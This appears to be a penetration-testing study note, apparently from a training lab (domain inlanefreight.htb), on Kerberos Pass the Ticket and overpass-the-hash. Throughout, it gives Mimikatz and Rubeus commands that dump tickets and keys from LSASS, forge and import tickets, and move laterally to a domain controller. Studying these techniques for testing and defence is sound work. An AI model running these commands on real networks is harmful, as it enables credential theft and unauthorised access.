- Pass the Ticket (PtT): use a stolen Kerberos ticket instead of a password/hash
- 2 ticket types: TGT (Ticket Granting Ticket, get more tickets with this) and TGS (Service Ticket, access to one specific service)
- Tickets live in LSASS memory, so same access level needed as dumping LSASS (local admin)

---
## Harvest tickets
**Mimikatz** (writes `.kirbi` files to disk)
```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
- Files named `[id]-user@service-domain.kirbi`, one with `krbtgt` in the name = that user's TGT (most valuable, can get any service ticket from it)

**Rubeus** (dumps as Base64 instead of files, easier to copy-paste)
```cmd
Rubeus.exe dump /nowrap
```

---
## Pass the Key / OverPass the Hash
- Converts a hash (rc4/aes) into a full TGT, basically "upgrade" a stolen hash into Kerberos tickets
```cmd
mimikatz # sekurlsa::ekeys          # dump the keys first
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:<hash>
```
or with Rubeus (doesn't need admin rights, unlike Mimikatz for this one):
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<key> /nowrap
```

---
## Actually using the ticket (Pass the Ticket)
**Rubeus** - straight to importing with `/ptt`, or import a saved `.kirbi`
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<hash> /ptt
Rubeus.exe ptt /ticket:julio.kirbi
```

**Mimikatz**
```cmd
mimikatz # kerberos::ptt "julio.kirbi"
```

- Once imported, just use normal Windows commands, the ticket in our session handles auth:
```cmd
dir \\DC01.inlanefreight.htb\c$
```

---
## Lateral movement with PowerShell Remoting
```cmd
mimikatz # kerberos::ptt "john.kirbi"
```
then from a normal powershell window (ticket is already imported in that cmd session):
```powershell
Enter-PSSession -ComputerName DC01
```
- Rubeus `createnetonly` can make a throwaway logon session first, so we don't overwrite/lose our current session's existing tickets:
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

See [[Pass the Ticket (Linux)]] for the Linux side of this and [[Mimikatz]] / [[Rubeus]] for the tool notes.